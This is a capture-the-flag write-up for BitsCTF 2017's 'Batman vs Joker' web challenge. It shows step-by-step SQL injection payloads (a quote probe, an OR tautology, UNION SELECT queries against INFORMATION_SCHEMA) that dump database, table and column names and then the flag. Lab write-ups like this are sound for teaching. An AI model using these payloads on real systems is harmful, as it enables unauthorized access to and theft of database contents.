_[<<< Return to BitsCTF 2017 tasks and writeups](/bitsctf-2017)_
# Batman vs Joker (Web, 30 points)

>Joker has left a message for you.
Your job is to get to the message asap. joking.bitsctf.bits-quark.org

This challenge looks like the "low" level of
[Damn Vulnerable Web Application](http://www.dvwa.co.uk/).

This website allows us to query the "CIA Ofiicial Records" (sic) by entering an id in the textbox.

```
>>> id: 1
First name:Harry
Surname: Potter
```

```
>>> id: 2
First name:Hermione
Surname: Granger
```

```
>>> id: 3
First name:Ronald
Surname: Weasley
```

```
>>> id: 4
First name:Joker
Surname: Joker
```

Now let's try some basic [SQL injections](https://www.owasp.org/index.php/SQL_Injection).

```
>>> id: 1'
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' Limit 1' at line 1
```

```
>>> id: 1' OR '1'='1'#
First name:Harry
Surname: Potter

First name:Hermione
Surname: Granger

First name:Ronald
Surname: Weasley

First name:Joker
Surname: Joker
```

Name of all the databases?

```
>>> id: ' UNION SELECT 1, schema_name FROM INFORMATION_SCHEMA.SCHEMATA#
First name:1
Surname: information_schema

First name:1
Surname: hack

First name:1
Surname: mysql

First name:1
Surname: performance_schema
```

Name of tables in the 'hack' database?

```
>>> id: ' UNION SELECT 1, table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='hack'#
First name:1
Surname: CIA_Official_Records

First name:1
Surname: Joker
```

Name of columns in the 'Joker' table?

```
>>> id: ' UNION SELECT 1, column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='Joker'#
First name:1
Surname: Flag

First name:1
Surname: HaHaHa
```

Let's grab the flag and the points!

```
>>> id: ' UNION SELECT Flag, HaHaHa from Joker#
First name:BITSCTF{wh4t_d03snt_k1ll_y0u_s1mply_m4k3s_y0u_str4ng3r!}
Surname: Enjoying the game Batman!!!
```
